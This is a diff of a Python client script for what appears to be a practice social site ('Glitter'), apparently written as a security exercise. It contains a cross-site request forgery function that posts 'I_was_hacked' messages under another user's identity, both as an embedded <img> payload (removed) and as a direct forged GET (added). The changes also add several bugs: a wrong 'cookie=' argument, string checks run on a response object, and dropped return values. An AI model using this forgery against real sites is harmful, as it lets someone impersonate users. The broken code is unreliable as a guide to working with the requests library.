@@ -11,7 +11,7 @@ DEFAULT_HEADERS = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) Appl
 
 
 sock = None
-user_id = None
+user_id = 21502
 current_time = None
 cookie = None
 username = None
@@ -51,7 +51,7 @@ def send_and_receive_website(method, path, params=None, data=None, referer='home
     headers['Referer'] = URL + referer
     use_cookie = not (referer == "login" or path == "user/")
     if use_cookie and cookie:
-        resp = requests.request(method=method, url=url, params=params, data=data, headers=headers, cookies=cookie)
+        resp = requests.request(method=method, url=url, params=params, data=data, headers=headers, cookie=cookie)
     else:
         resp = requests.request(method=method, url=url, params=params, data=data, headers=headers)
     return resp
@@ -284,19 +284,33 @@ def send_multiple_wows(glit_id, count):
 
 
 def xsrf_send_message_to_yourself_from_another_user(publisher_id):
-    msg = '<img src="http://glitter.org.il/glit?id=-1&feed_owner_id=' + user_id + '&publisher_id=' + publisher_id + '&publisher_screen_name=hacked_user&publisher_avatar=im1&background_color=White&date=' + current_time + '&content=I_was_hacked&font_color=black">'
-    path = 'glit?id=-1&feed_owner_id=' + user_id + '&publisher_id=' + publisher_id + '&publisher_screen_name=kolin%20pom&publisher_avatar=im1&background_color=White&date=' + current_time + '&content=' + msg + '&font_color=black'
-    send_and_receive_website("GET", path)
+    global current_time
+    current_time = time.strftime("%Y-%m-%dT%H:%M:%S.000Z", time.gmtime())
+    path = (
+        "glit?id=-1"
+        + "&feed_owner_id=" + str(user_id)
+        + "&publisher_id=" + publisher_id
+        + "&publisher_screen_name=kolin%20pom"
+        + "&publisher_avatar=im1"
+        + "&background_color=White"
+        + "&date=" + current_time
+        + "&content=I_was_hacked"
+        + "&font_color=black"
+    )
+    send_and_receive_website(method="GET", path=path)
 
 
 def login_website():
+    global current_time
+    current_time = datetime.datetime.now()
     path = "user"
     payload = '["' + username + '","' + password + '"]'
     response = send_and_receive_website(method="POST", path=path, data=payload, referer="login")
-    if response.status_code == 200:
+    print(response)
+    if "200" in response:
         print("Successfully logged in!")
-        extract_sparkle_cookie(response.text)
-        extract_user_id(response.text)
+        extract_sparkle_cookie(response)
+        extract_user_id(response)
     return response
 
 
@@ -310,7 +324,11 @@ def extract_sparkle_cookie(response_text):
 
 
 def extract_user_id(response_text):
-    """Extract the user_id from the server response text."""
+    """
+    a function to extract the user_id from
+    :param response_text:
+    :return:
+    """
     global user_id
     if '"id":' in response_text:
         id_start = response_text.find('"id":') + 5
@@ -318,8 +336,6 @@ def extract_user_id(response_text):
         if id_end == -1:
             id_end = response_text.find('}', id_start)
         user_id = response_text[id_start:id_end]
-        return user_id
-    return None
 
 
 def get_password():
